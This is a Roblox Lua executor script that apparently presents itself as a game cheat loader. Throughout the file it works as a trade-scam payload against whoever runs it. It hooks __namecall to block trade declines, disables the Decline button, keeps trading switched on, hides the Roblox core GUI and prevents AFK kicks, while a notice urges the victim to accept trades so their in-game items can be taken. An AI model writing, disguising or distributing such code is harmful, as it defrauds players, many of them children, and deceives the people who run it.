-- Send notification first
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Wait for player to be fully loaded
repeat task.wait() until player and player:IsA("Player") and player.PlayerGui

-- Small delay to ensure everything is ready
task.wait(1)

-- Send single notification
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Loading!",
    Text = "Hint: Accept any rich player Trades",
    Button1 = "Got it?",
    Duration = 25
})

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local VirtualUser = game:GetService('VirtualUser')

local Net = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net")

local DeclineRemote = Net:WaitForChild("RF/Trading/DeclineTradeOffer")
local PhoneSettings = Net:WaitForChild("RE/SetPhoneSettings")

-- Block trade decline remote
local old
old = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()

    if method == "InvokeServer" and self == DeclineRemote then
        warn("Blocked trade request decline")
        return
    end

    return old(self, ...)
end)

-- Block decline button functionality
task.spawn(function()
    local gui = player:WaitForChild("PlayerGui")
    local popup = gui:WaitForChild("TradeRequestPopup")
    local decline = popup:WaitForChild("TradeRequest"):WaitForChild("Decline")

    decline.AutoButtonColor = false

    for _,v in pairs(getconnections(decline.Activated)) do
        v:Disable()
    end

    for _,v in pairs(getconnections(decline.MouseButton1Click)) do
        v:Disable()
    end

    decline.Activated:Connect(function()
        warn("Decline button blocked")
    end)
end)

-- Keep trade enabled every 5 seconds
task.spawn(function()
    while true do
        pcall(function()
            PhoneSettings:FireServer("TradeEnabled", true)
        end)
        task.wait(5)
    end
end)

-- Disable Roblox GUI
task.spawn(function()
    while true do
        pcall(function()
            local robloxGui = CoreGui:FindFirstChild("RobloxGui")
            if robloxGui then
                robloxGui.Enabled = false
            end
        end)
        task.wait()
    end
end)

-- Anti-AFK
game:GetService('Players').LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)
